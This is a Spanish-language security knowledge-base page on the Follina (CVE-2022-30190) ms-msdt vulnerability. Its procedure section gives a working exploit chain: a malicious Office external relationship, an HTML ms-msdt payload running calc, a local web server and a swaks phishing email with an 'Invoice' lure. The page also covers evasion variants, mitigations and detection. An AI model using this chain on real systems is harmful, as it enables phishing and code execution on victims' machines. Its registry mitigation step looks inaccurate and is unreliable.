---
topic: Follina (CVE-2022-30190) y el protocolo ms-msdt
tags: [windows, follina, msdt, cve-2022-30190, office]
---

# Follina (CVE-2022-30190) y el protocolo ms-msdt

[🇬🇧 English](follina-msdt.en.md) | **Español**

## Concepto

Follina es una vulnerabilidad del Microsoft Support Diagnostic Tool (MSDT) que se activa con el esquema `ms-msdt:`. Un documento de Office abre una URL remota y MSDT ejecuta código PowerShell sin mostrar la interfaz de diagnóstico. El fallo afecta a Windows y se explotó con documentos Word maliciosos.

## Cuándo aplica

- Windows sin el parche de junio de 2022.
- Office abre el documento y permite el protocolo `ms-msdt`.
- El host tiene salida a Internet o al servidor del atacante.
- La víctima abre el fichero y acepta el aviso de vista protegida, si aparece.

## Requisitos y condiciones

1. Documento con una relación externa (`settings.xml.rels`) que apunta a `ms-msdt:`.
2. Servidor HTTP que sirva el HTML con el script de diagnóstico.
3. MSDT habilitado y no bloqueado por política.
4. Interacción mínima de la víctima (abrir el documento).

## Procedimiento

El documento contiene una relación externa:

```xml
<Relationship Id="rId1"
  Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
  Target="ms-msdt:/id PCWDiagnostic /skip force /param ..." TargetMode="External"/>
```

El HTML servido usa el parámetro para cargar PowerShell:

```html
<script>
location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_BrowseForFile=/../../$(calc).exe /auto\"";
</script>
```

Se sirve con un HTTP simple y se envía el documento por correo:

```bash
python3 -m http.server 80
swaks --to victim@example.com --from it@example.com \
  --header 'Subject: Invoice' --attach document.docx
```

Al abrirlo, MSDT ejecuta el comando en el contexto del usuario.

## Variantes

- **RTF** en lugar de DOCX, con el mismo esquema.
- **Enlace `ms-msdt:`** en un correo o un documento, sin adjunto.
- **Ofuscación del HTML** para evadir filtros de correo.
- **Cadenas de diagnóstico** que descargan un segundo stage.

## Limitaciones

- Microsoft parcheó el fallo en junio de 2022; los hosts actualizados no son vulnerables.
- La Vista protegida y las políticas de Office pueden bloquear la relación externa.
- El protocolo `ms-msdt` puede estar deshabilitado por GPO.
- La ejecución es en el contexto del usuario, no SYSTEM; para elevar hace falta un segundo paso.

## Mitigación

- Aplicar el parche de CVE-2022-30190 y mantener Office actualizado.
- Deshabilitar `ms-msdt` con la clave `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msdt.exe`.
- Bloquear adjuntos y protocolos peligrosos en el correo.
- Activar Protected View y ASR rules para Office.

## Detección

- `msdt.exe` como proceso hijo de `WINWORD.EXE` o `OUTLOOK.EXE`.
- Conexiones HTTP salientes desde Office o MSDT hacia dominios no corporativos.
- Eventos de creación de procesos con `PCWDiagnostic` y parámetros `IT_BrowseForFile`.
- Documentos con relaciones externas a `ms-msdt:`.

MITRE ATT&CK: T1204.002 (Malicious File), T1218 (System Binary Proxy Execution), T1566.001 (Spearphishing Attachment).

## Referencias

- <https://nvd.nist.gov/vuln/detail/CVE-2022-30190>
- <https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-30190>
- <https://attack.mitre.org/techniques/T1218/>
